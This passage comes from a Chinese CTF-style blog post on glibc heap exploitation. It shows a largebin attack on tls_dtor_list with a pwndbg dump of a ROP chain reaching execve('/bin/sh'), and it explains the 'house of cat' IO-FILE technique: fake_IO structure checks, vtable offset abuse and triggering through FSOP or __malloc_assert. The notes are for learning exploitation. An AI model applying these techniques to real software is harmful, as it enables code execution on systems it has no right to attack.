class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">28</span>gx <span class=\"number\">0x5572d1a52290</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a52290</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x00000000000000b1</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a522a0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a522b0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000418</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a522c0</span>:\t<span class=\"number\">0x00005572d1a52770</span>\t<span class=\"number\">0x0000000000000418</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a522d0</span>:\t<span class=\"number\">0x0000000000000418</span>\t<span class=\"number\">0x00005572d1a52b90</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a522e0</span>:\t<span class=\"number\">0x0000000000000418</span>\t<span class=\"number\">0x0000000000000418</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a522f0</span>:\t<span class=\"number\">0x00005572d1a52fb0</span>\t<span class=\"number\">0x0000000000000418</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a52300</span>:\t<span class=\"number\">0x0000000000000418</span>\t<span class=\"number\">0x00005572d1a533d0</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a52310</span>:\t<span class=\"number\">0x0000000000000418</span>\t<span class=\"number\">0x0000000000000418</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a52320</span>:\t<span class=\"number\">0x00005572d1a537f0</span>\t<span class=\"number\">0x0000000000000418</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a52330</span>:\t<span class=\"number\">0x0000000000000418</span>\t<span class=\"number\">0x00005572d1a53c10</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a52340</span>:\t<span class=\"number\">0x0000000000000418</span>\t<span class=\"number\">0x0000000000000841</span>\t\t\t\t<span class=\"comment\">//原本为0x421</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a52350</span>:\t<span class=\"number\">0x00007fa2a9bbace0</span>\t<span class=\"number\">0x00007fa2a9bbace0</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a52360</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br></pre></td></tr></table></figure>\n<p>重新申请第一个 chunk 区域，第二个 chunk 的数据就会被更改了。</p>\n<p>我们就完成了 libc 的泄露，下面就是堆 heap 地址的泄露，只要有了 overlap 我们就完成了两地址的泄露 ，这里不在细说。</p>\n<p>接下来就是利用 largebinattack 攻击，首先修改 tls_dtor_list 的值为一个我们可控制的 chunk 地址。然后修改 secret 为已知可控地址。secret 是 tcache,fastbin 加密 key。</p>\n<p>tls_dtor_list 结构体的为</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*(<span class=\"keyword\">struct</span> dtor_list *) <span class=\"number\">0x563bed37d920</span></span><br><span class=\"line\">$<span class=\"number\">8</span> = &#123;</span><br><span class=\"line\">  func = <span class=\"number\">0x525a0543f9580000</span>,</span><br><span class=\"line\">  obj = <span class=\"number\">0x7f16ef9363e5</span> &lt;iconv+<span class=\"number\">197</span>&gt;,</span><br><span class=\"line\">  <span class=\"built_in\">map</span> = <span class=\"number\">0x7f16efae4698</span>,</span><br><span class=\"line\">  next = <span class=\"number\">0x7f16ef937e51</span> &lt;__gconv_close_transform+<span class=\"number\">225</span>&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">+++++++++++++++++++++++</span><br><span class=\"line\">pwndbg&gt; tel <span class=\"number\">0x563bed37d920</span> <span class=\"number\">10</span></span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│  <span class=\"number\">0x563bed37d920</span> ◂— <span class=\"number\">0x525a0543f9580000</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│  <span class=\"number\">0x563bed37d928</span> —▸ <span class=\"number\">0x7f16ef9363e5</span> (iconv+<span class=\"number\">197</span>) ◂— pop    rdi</span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│  <span class=\"number\">0x563bed37d930</span> —▸ <span class=\"number\">0x7f16efae4698</span> ◂— <span class=\"number\">0x68732f6e69622f</span> <span class=\"comment\">/* &#x27;/bin/sh&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│  <span class=\"number\">0x563bed37d938</span> —▸ <span class=\"number\">0x7f16ef937e51</span> (__gconv_close_transform+<span class=\"number\">225</span>) ◂— pop    rsi</span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│  <span class=\"number\">0x563bed37d940</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│  <span class=\"number\">0x563bed37d948</span> —▸ <span class=\"number\">0x7f16efa2b497</span> (qecvt+<span class=\"number\">39</span>) ◂— pop    rdx</span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│  <span class=\"number\">0x563bed37d950</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">0038</span>│  <span class=\"number\">0x563bed37d958</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">08</span>:<span class=\"number\">0040</span>│  <span class=\"number\">0x563bed37d960</span> —▸ <span class=\"number\">0x7f16ef9f70f0</span> (execve) ◂— endbr64</span><br></pre></td></tr></table></figure>\n<p>总结下，这里。00 的位置，其实是任意代码执行的，除了可以写 leave，但是貌似这里的写法已经很直接，所以我们无需再更改，如有需要可以写为 orw.secret 其实是否需要改写，是根据是否可以泄露出 secret 而定，如果可以，就不需要改写，一些攻击即可。</p>\n<p>我们修改 tls_dtor_list 为一个堆头地址，我们还要将这个头部改写，因为任意代码执行就是这个直接地址开始的。</p>\n<p>关于 largebinattack，如果 bin 只有一个 free_chunk，我们攻击的话，只需要修改其 bk_nextsize。</p>\n<p>同时，我们也可以进行多次攻击，只要是 size 比第一个小，就会进行前插，但是这次不是修改第一个头的 bk_next, 而是第一次那个。就是说在同一个位置修改，其他尽量保持不变。</p>\n<p>关键就在与修改 tls_dtor_list，开始这里是空的，将其指向一个 chunk, 并且完全控制这里，在这里构造一个 leave ret 加上 rop，注意的是 leaveret 的地址要进行加密。</p>\n<h2 id=\"house-of-cat\"><a class=\"markdownIt-Anchor\" href=\"#house-of-cat\">#</a> house of cat</h2>\n<p>这是一个比较新的路径，是 catF1y 师傅挖出来的一条链子，并且在强网杯初赛部署了同名题目。但是，就在比赛前夕，以为师傅连更两条博客，house of apple2 以及 house of apple3，导致了题目被非预期。同时，我们也尝试了使用 house of emma，成功非预期。这里就先开始预期解的 house of cat 的学习记录。</p>\n<p>高版本的 glibc 就是对 io 的疯狂脑洞输出。house of cat 也是一个有关 io 的利用路径。</p>\n<h3 id=\"利用条件\"><a class=\"markdownIt-Anchor\" href=\"#利用条件\">#</a> 利用条件</h3>\n<ul>\n<li>1. 能够任意地址写一个可控堆地址。</li>\n<li>2. 能够泄露堆地址和 libc 基址。</li>\n<li>3. 能够触发 IO 流（FSOP 或触发__malloc_assert），执行 IO 相关函数。</li>\n</ul>\n<p>其实从这里我们看出，这里的利用条件与其他的一些手法极为相似，基本就是利用 exit () 函数退出的一些操作。随着版本的迭代，glibc 对于虚表的保护也是不断的更新，首先就是对于 io_file_jump 的检查，包括但不限于禁止直接修改虚表内容、检查虚表地址是否合法（在规定的虚表地址范围内）。其实之前我们讲过利用 io_str_jump 的虚表绕过检查，但是当时的方法的弊端就是两个函数_IO_str_overflow 以及_IO_str_finish 的相关漏洞被封死。</p>\n<p>这里作者利用了一个新的 io 虚表结构体_IO_wfile_jumps，然后下面的操作与_IO_str_jumps 非常相似，甚至函数名字都很相似</p>\n<p>这里我先介绍下目标函数是如何实现然亦函数调用的，</p>\n<p>结构体</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span> _<span class=\"title\">IO_wfile_jumps</span> <span class=\"title\">libio_vtable</span> =</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  JUMP_INIT_DUMMY,</span><br><span class=\"line\">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class=\"line\">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class=\"line\">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class=\"line\">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class=\"line\">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class=\"line\">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class=\"line\">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class=\"line\">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class=\"line\">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class=\"line\">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class=\"line\">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class=\"line\">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class=\"line\">  JUMP_INIT(read, _IO_file_read),</span><br><span class=\"line\">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class=\"line\">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class=\"line\">  JUMP_INIT(close, _IO_file_close),</span><br><span class=\"line\">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class=\"line\">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class=\"line\">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>原理，利用程序报错__malloc_asset 报错调用 xsputn, 替换该虚表函数为 _IO_wfile_seekfoff</p>\n<p>FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。</p>\n<p>其中的函数（_IO_wfile_seekoff）的内部结构为</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">off64_t</span> _IO_wfile_seekoff (FILE *fp, <span class=\"type\">off64_t</span> offset, <span class=\"type\">int</span> dir, <span class=\"type\">int</span> mode)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">off64_t</span> result;</span><br><span class=\"line\">  <span class=\"type\">off64_t</span> delta, new_offset;</span><br><span class=\"line\">  <span class=\"type\">long</span> <span class=\"type\">int</span> count;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (mode == <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> do_ftell_wide (fp);</span><br><span class=\"line\">  <span class=\"type\">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class=\"line\">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class=\"line\">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class=\"line\">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class=\"line\">#需要绕过was_writing的检测</span><br><span class=\"line\">  <span class=\"type\">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class=\"line\">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class=\"line\">              || _IO_in_put_mode (fp));</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> WEOF;</span><br><span class=\"line\">......</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果 mode!=0 且 fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base 会调用_IO_switch_to_wget_mode 这个函数，继续跟进代码。虽然说这里要求的是 mode 值不为零，但是在最开始伪造的时候，mode 设置却还是 0，不过调试的时候，发现这里可能会发生变化，从我们传入的 0 变为了 - 1。经过测试，最开始也可以将 mode 设置为 1 ，后面触发__malloc_assert,mode 不会被更改。（这条仅在 house of cat 同名题目测试）。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> _IO_switch_to_wget_mode (FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((<span class=\"type\">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">  ......</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>而_IO_WOVERFLOW 是 glibc 里定义的一个宏调用函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br></pre></td></tr></table></figure>\n<p>可以看到对_IO_WOVERFLOW 没有进行任何检测，为了便于理解，我们再来看看汇编代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x7f4cae745d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class=\"line\"> 0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class=\"line\"> 0x7f4cae745d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class=\"line\"> 0x7f4cae745d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class=\"line\"> 0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class=\"line\"> 0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class=\"line\"> 0x7f4cae745d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                &lt;_IO_switch_to_wget_mode+56&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"> 0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class=\"line\"> 0x7f4cae745d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class=\"line\"> 0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>\n<p>在造成任意地址写一个堆地址的基础上，这里的寄存器 rdi（fake_IO 的地址）、rax 和 rdx 都是我们可以控制的，</p>\n<p>rdi 是我们伪造的 io_file 的地址，我们将 rax 控制为堆上的一个地址，就可以实现任意函数的调用。</p>\n<p>这里还要补习一下 setcontext 的知识</p>\n<p>在开启沙箱的情况下，假如把最后调用的 [rax + 0x18] 设置为 setcontext，把 rdx 设置为可控的堆地址，就能执行 srop 来读取 flag；如果未开启沙箱，则只需把最后调用的 [rax + 0x18] 设置为 system 函数，把 fake_IO 的头部写入 /bin/sh 字符串，就可执行 system (&quot;/bin/sh&quot;)</p>\n<p>fake_IO 结构体需要绕过的检测</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_wide_data-&gt;_IO_read_ptr ！=_wide_data-&gt;_IO_read_end</span><br><span class=\"line\">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class=\"line\">#如果_wide_data=fake_io_addr+<span class=\"number\">0x30</span>，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class=\"line\">fp``-``&gt;_lock是一个可写地址</span><br><span class=\"line\">fp``-``&gt;_mode ``=` `<span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n<p>大致的攻击流程</p>\n<ol>\n<li>修改_IO_list_all 为可控地址（FSOP）或修改 stderr 为可控地址 (__malloc_assert)。</li>\n<li>在上一步的可控地址中伪造 fake_IO 结构体。</li>\n<li>通过 FSOP 或 malloc 触发攻击。</li>\n</ol>\n<p>但是当我进行到这里的时候，我发现不能独立正常的复现，因为作者的文章并没有给出这条完整利用链。</p>\n<h3 id=\"问题\"><a class=\"markdownIt-Anchor\" href=\"#问题\">#</a> 问题</h3>\n<ul>\n<li>完整的利用链是从哪里触发， 完整的函数调用链是怎么样的？</li>\n<li>作者提出了两个不同的流程，一个是进行 FSOP，利用的是_IO_flush_all_lockp 函数来刷新所有的 IO 流。也就是说最后是进入 flush 函数，进行一系列的调用，对应的就是虚表中的_IO_overflow. 但是_IO_flush_all_lockp 触发的前提应该是能执行 exit (显式调用、libc 调用 abort、以及 main 函数正常退出)</li>\n<li>另外一个思路是利用利用__malloc_assert 触发的报错。会使用 stderr 进行一个报错输出</li>\n</ul>\n<p>以上，house of cat 的关键点是 JUMP_INIT (seekoff, _IO_wfile_seekoff), 顺利的进入后又会执行 _IO_switch_to_wget_mode (fp)，最大的问题就是如何进入这里 _IO_wfile_seekoff?</p>\n<p>以下为个人的分析过程</p>\n<p>我们要知道这里代替了谁。函数的入口在于 IO 函数初始化后调用谁的问题，因为我们是对 vtable 进行了偏移替换，所以我们将二者进行一个对比。</p>\n<p>修改前的 IO_list_all 的对应</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p &amp;_IO_list_all</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"keyword\">struct</span> _IO_FILE_plus **) <span class=\"number\">0x7f56882ae680</span> &lt;_IO_list_all&gt;</span><br><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus **) <span class=\"number\">0x7f56882ae680</span> </span><br><span class=\"line\">$<span class=\"number\">2</span> = (<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x7f56882ae6a0</span> &lt;_IO_2_1_stderr_&gt;</span><br><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x7f56882ae6a0</span> </span><br><span class=\"line\">$<span class=\"number\">3</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-72540025</span>,</span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class=\"number\">131</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x7f56882ae724</span> &lt;_IO_2_1_stderr_+<span class=\"number\">132</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _chain = <span class=\"number\">0x7f56882ae780</span> &lt;_IO_2_1_stdout_&gt;,</span><br><span class=\"line\">    _fileno = <span class=\"number\">2</span>,</span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _old_offset = <span class=\"number\">-1</span>,</span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>,</span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _lock = <span class=\"number\">0x7f56882afa60</span> &lt;_IO_stdfile_2_lock&gt;,</span><br><span class=\"line\">    _offset = <span class=\"number\">-1</span>,</span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x7f56882ad8a0</span> &lt;_IO_wide_data_2&gt;,</span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _mode = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">19</span> times&gt;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  vtable = <span class=\"number\">0x7f56882aa600</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">pwndbg&gt; p _IO_file_jumps</span><br><span class=\"line\">$<span class=\"number\">4</span> = &#123;</span><br><span class=\"line\">  __dummy = <span class=\"number\">0</span>,</span><br><span class=\"line\">  __dummy2 = <span class=\"number\">0</span>,</span><br><span class=\"line\">  __finish = <span class=\"number\">0x7f5688120070</span> &lt;_IO_new_file_finish&gt;,</span><br><span class=\"line\">  __overflow = <span class=\"number\">0x7f5688120e40</span> &lt;_IO_new_file_overflow&gt;,</span><br><span class=\"line\">  __underflow = <span class=\"number\">0x7f5688120b30</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class=\"line\">  __uflow = <span class=\"number\">0x7f5688121de0</span> &lt;__GI__IO_default_uflow&gt;,</span><br><span class=\"line\">  __pbackfail = <span class=\"number\">0x7f5688123300</span> &lt;__GI__IO_default_pbackfail&gt;,</span><br><span class=\"line\">  __xsputn = <span class=\"number\">0x7f568811f680</span> &lt;_IO_new_file_xsputn&gt;,</span><br><span class=\"line\">  __xsgetn = <span class=\"number\">0x7f568811f330</span> &lt;__GI__IO_file_xsgetn&gt;,</span><br><span class=\"line\">  __seekoff = <span class=\"number\">0x7f568811e960</span> &lt;_IO_new_file_seekoff&gt;,</span><br><span class=\"line\">  __seekpos = <span class=\"number\">0x7f5688122530</span> &lt;_IO_default_seekpos&gt;,</span><br><span class=\"line\">  __setbuf = <span class=\"number\">0x7f568811e620</span> &lt;_IO_new_file_setbuf&gt;,</span><br><span class=\"line\">  __sync = <span class=\"number\">0x7f568811e4b0</span> &lt;_IO_new_file_sync&gt;,</span><br><span class=\"line\">  __doallocate = <span class=\"number\">0x7f5688112b90</span> &lt;__GI__IO_file_doallocate&gt;,</span><br><span class=\"line\">  __read = <span class=\"number\">0x7f568811f9b0</span> &lt;__GI__IO_file_read&gt;,</span><br><span class=\"line\">  __write = <span class=\"number\">0x7f568811ef40</span> &lt;_IO_new_file_write&gt;,</span><br><span class=\"line\">  __seek = <span class=\"number\">0x7f568811e6f0</span> &lt;__GI__IO_file_seek&gt;,</span><br><span class=\"line\">  __close = <span class=\"number\">0x7f568811e610</span> &lt;__GI__IO_file_close&gt;,</span><br><span class=\"line\">  __stat = <span class=\"number\">0x7f568811ef30</span> &lt;__GI__IO_file_stat&gt;,</span><br><span class=\"line\">  __showmanyc = <span class=\"number\">0x7f56881234a0</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class=\"line\">  __imbue = 